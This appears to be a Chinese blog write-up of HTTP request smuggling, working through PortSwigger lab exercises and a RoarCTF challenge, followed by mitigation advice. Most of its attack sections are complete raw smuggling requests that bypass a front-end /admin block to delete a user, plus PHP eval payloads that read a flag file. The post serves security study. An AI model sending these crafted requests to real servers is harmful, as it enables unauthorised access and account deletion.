href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">CL.TE实验环境</a></p><blockquote><p>实验描述：<br>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码（Transfer-Encoding解析），前端服务器拒绝未使用GET或POST方法之外的请求。</p><p>实验要求：<br>将请求走私到后端服务器，以便后端服务器处理的下一个请求像是使用了GPOST方法。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210401195309792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://img-blog.csdnimg.cn/20210401195426801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>将请求行中请求方式修改为POST,在请求行添加Transfer-<code>Encoding: chunked</code>，然后在实体中添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求就可以获得响应。<br><img src="https://img-blog.csdnimg.cn/20210401195436975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>分析：连续请求，G会被带入下一个请求，变为 <code>GPOST / HTTP/1.1\r\n</code></p><p><strong>触发过程</strong></p><p>前端服务器处理Content-Length头并确定请求主体长度为6个字节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">0\r\n<br>\r\n<br>G<br></code></pre></td></tr></table></figure><p>此请求经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到<code>0\r\n\r\n</code>时，会被认为已经读取到结尾了，但是剩下的字母G就被留在了缓冲区中，等待后续请求的到来。当我们重复发送请求后，G会被带入下一个请求，发送的请求在后端服务器变为 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br></code></pre></td></tr></table></figure><p>服务器在解析时会产生报错</p><h3 id="TE-TE漏洞"><a href="#TE-TE漏洞" class="headerlink" title="TE-TE漏洞"></a>TE-TE漏洞</h3><p>在这里，前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</p><p>详见 <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC7230 section 3.3.3.3</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">If</span> a Transfer-<span class="hljs-keyword">Encoding</span> <span class="hljs-keyword">header</span> field <span class="hljs-keyword">is</span> present <span class="hljs-keyword">in</span> a response <span class="hljs-keyword">and</span><br>the chunked transfer coding <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> the final <span class="hljs-keyword">encoding</span>, the<br>message body length <span class="hljs-keyword">is</span> determined <span class="hljs-keyword">by</span> reading the <span class="hljs-keyword">connection</span> <span class="hljs-keyword">until</span><br>it <span class="hljs-keyword">is</span> closed <span class="hljs-keyword">by</span> the <span class="hljs-keyword">server</span>.  <span class="hljs-keyword">If</span> a Transfer-<span class="hljs-keyword">Encoding</span> <span class="hljs-keyword">header</span> field<br><span class="hljs-keyword">is</span> present <span class="hljs-keyword">in</span> a request <span class="hljs-keyword">and</span> the chunked transfer coding <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span><br>the final <span class="hljs-keyword">encoding</span>, the message body length cannot be determined<br>reliably; the <span class="hljs-keyword">server</span> MUST respond <span class="hljs-keyword">with</span> the <span class="hljs-number">400</span> (Bad Request)<br>status code <span class="hljs-keyword">and</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">close</span> the <span class="hljs-keyword">connection</span>.<br></code></pre></td></tr></table></figure><p>这里列出七种混淆方式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Transfer-Encoding: xchunked<br><br>Transfer-Encoding : chunked<br><br>Transfer-Encoding: x<br><br>Transfer-Encoding:[tab]chunked<br><br>[space]Transfer-Encoding: chunked<br><br>X: X[\n]Transfer-Encoding: chunked<br><br>Transfer-Encoding<br>: chunked<br></code></pre></td></tr></table></figure><p>之所以在处理这些请求头时会出现问题，是因为在实际的HTTP协议实现中，很少有代码精确的遵循了其中的规范，以此导致面对变形的请求头时会出现不同的处理方式。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">TE.CL验环境</a><br><img src="https://img-blog.csdnimg.cn/20210406194449533.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造请求，注意同样需要去掉勾选Update Content-Length</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>Transfer-encoding: cow\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求<br><img src="https://img-blog.csdnimg.cn/20210406194916305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>分析：前端将body的内容视为正常请求，到了后端，因为<code>Transfer-encoding: cow</code>无法识别，将会转而使用<code>Content-length: 4</code>，从而产生报错</p><h3 id="TE-CL漏洞"><a href="#TE-CL漏洞" class="headerlink" title="TE-CL漏洞"></a>TE-CL漏洞</h3><p>所谓TE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding这一请求头，而后端服务器处理Content-Length请求头。</p><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">TE.CL验环境</a><br><img src="https://img-blog.csdnimg.cn/20210401203035140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击Access the lab，跳转新的页面，在新的页面进行抓包<br><img src="https://img-blog.csdnimg.cn/20210401203313792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入实验，首先需要去掉勾选Update Content-Length防止Buprsuite自动更新Content-Length字段<br><img src="https://img-blog.csdnimg.cn/20210401203510350.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>构造请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>......<br>Transfer-Encoding: chunked\r\n<br>Content-Length: 3\r\n<br>\r\n<br>1\r\n<br>G\r\n<br>0\r\n<br>\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续发送两次请求得到响应<br><img src="https://img-blog.csdnimg.cn/20210401204242691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>G和0被走私了，带入了带入下一个请求，响应报文请求方法是G0POST，我们需要完整构造GPOST报文请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: demo.com\r\n<br>Content-Length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>12\r\n<br>GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>连续请求两次<br><img src="https://img-blog.csdnimg.cn/20210401205419277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>官方提供的方法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1\r\n<br>Host: your-lab-id.web-security-academy.net\r\n<br>Content-length: 4\r\n<br>Transfer-Encoding: chunked\r\n<br>\r\n<br>5c\r\n<br>GPOST / HTTP/1.1\r\n<br>Content-Type: application/x-www-form-urlencoded\r\n<br>Content-Length: 15\r\n<br>\r\n<br>x=1\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>得到响应<br><img src="https://img-blog.csdnimg.cn/20210401204904828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>触发过程</strong><br>由于前端服务器处理Transfer-Encoding，当其读取到0\r\n\r\n时，认为是读取完毕了，此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，当它读取完12\r\n之后，就认为这个请求已经结束了，后面的数据就认为是另一个请求了，也就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">GPOST / HTTP/1.1\r\n<br>\r\n<br>0\r\n<br>\r\n<br></code></pre></td></tr></table></figure><p>成功报错。</p><p>前端服务器处理Transfer-Encoding标头，因此将消息正文视为使用分块编码。它处理第一个块，声明为12个字节长，直到下一行的开始<code>GPOST / HTTP/1.1</code>。它处理第二个数据块，该数据块的长度为零，因此被视为终止请求。该请求被转发到后端服务器。</p><p>后端服务器处理Content-Length标头，并确定请求主体的长度为4个字节，直到下一行的开始12。以下以开头的字节<code>GPOST / HTTP/1.1</code>未处理，后端服务器会将其视为序列中下一个请求的开始。</p><h2 id="绕过前端服务器安全控制"><a href="#绕过前端服务器安全控制" class="headerlink" title="绕过前端服务器安全控制"></a>绕过前端服务器安全控制</h2><blockquote><p>实验描述：</p><p>本实验涉及前端和后端服务器，并且前端服务器不支持分块编码。处有一个管理面板/admin，但是前端服务器禁止访问它。</p><p>要解决此问题，请将请求走私到访问管理面板并删除用户的后端服务器carlos。</p></blockquote><h3 id="利用CL-TE漏洞绕过"><a href="#利用CL-TE漏洞绕过" class="headerlink" title="利用CL-TE漏洞绕过"></a>利用CL-TE漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a></p><p><img src="https://img-blog.csdnimg.cn/20210408194510910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>按照要求访问管理面板/admin，会提示Path /admin is blocked</p><p>利用CL-TE漏洞，构造数据包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 37<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>发现只能本地用户查看<br><img src="https://img-blog.csdnimg.cn/20210408195201254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>连续两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 54<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>X-Ignore: X<br></code></pre></td></tr></table></figure><p>观察到由于第二个请求的Host标头与第一个请求中的走私Host标头冲突，该请求被阻止。<br><img src="https://img-blog.csdnimg.cn/20210408195343875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>两次发出以下请求，以便将第二个请求的标头附加到走私的请求正文中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 116<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>现在可以访问管理面板<br><img src="https://img-blog.csdnimg.cn/20210408195520760.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>根据响应内容，更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Length: 139<br>Transfer-Encoding: chunked<br><br>0<br><br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 10<br><br>x=<br></code></pre></td></tr></table></figure><p>没有回显内容，使用上个数据包访问管理面板，验证是否删除成功<br><img src="https://img-blog.csdnimg.cn/20210408201722326.png#pic_center" alt="在这里插入图片描述"></p><h3 id="利用TE-CL漏洞绕过"><a href="#利用TE-CL漏洞绕过" class="headerlink" title="利用TE-CL漏洞绕过"></a>利用TE-CL漏洞绕过</h3><p><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">实验环境</a><br><img src="https://img-blog.csdnimg.cn/20210408202433386.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这次利用TE-CL漏洞，构造数据包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>60<br>POST /admin HTTP/1.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>允许本地查看<br><img src="https://img-blog.csdnimg.cn/20210408203126318.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>两次发出以下请求：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-Type: application/x-www-form-urlencoded<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>71<br>POST /admin HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>成功访问管理员页面<br><img src="https://img-blog.csdnimg.cn/20210408203349163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>更改走私的请求URL以删除用户carlos：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST / HTTP/1.1<br>Host: your-lab-id.web-security-academy.net<br>Content-length: 4<br>Transfer-Encoding: chunked<br><br>87<br>GET /admin/delete?username=carlos HTTP/1.1<br>Host: localhost<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 15<br><br>x=1<br>0\r\n<br>\r\n<br>\r\n<br><br></code></pre></td></tr></table></figure><p>访问管理员页面验证是否删除<br><img src="https://img-blog.csdnimg.cn/20210408203807849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="CTF中的请求走私"><a href="#CTF中的请求走私" class="headerlink" title="CTF中的请求走私"></a>CTF中的请求走私</h2><p><strong>[RoarCTF 2019]Easy Calc</strong><br><img src="https://img-blog.csdnimg.cn/20210329210036824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>calc.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在phpifo页面中发现禁用了一些函数和字符，所以尝试绕过，可以利用请求走私。</p><p>利用CL-CL漏洞，需要返回400错误<br><img src="https://img-blog.csdnimg.cn/20210411194834365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看phpinfo()信息<br><img src="https://img-blog.csdnimg.cn/20210411195001405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><code>getcwd()</code>:获取当前工作目录<br><img src="https://img-blog.csdnimg.cn/20210411195123773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>var_dump(scandir(dirname(__FILE__)))</code>：获取当前目录下的文件<br><img src="https://img-blog.csdnimg.cn/20210411195331613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>print_r(scandir(chr(47)))</code>：扫描根目录<br><img src="https://img-blog.csdnimg.cn/2021041119540679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><code>var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>：读取flag<br><img src="https://img-blog.csdnimg.cn/20210411195452696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>同样利用CL-TE漏洞同样可以读取flag<br><img src="https://img-blog.csdnimg.cn/20210411195537869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p><ul><li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li><li>使用HTTP / 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li><li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。</li></ul><p>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</p><p>参考文章：<br><a href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a><br><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a><br><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>USB流量分析</title>
    <link href="/posts/1618977825/"/>
    <url>/posts/1618977825/</url>
    
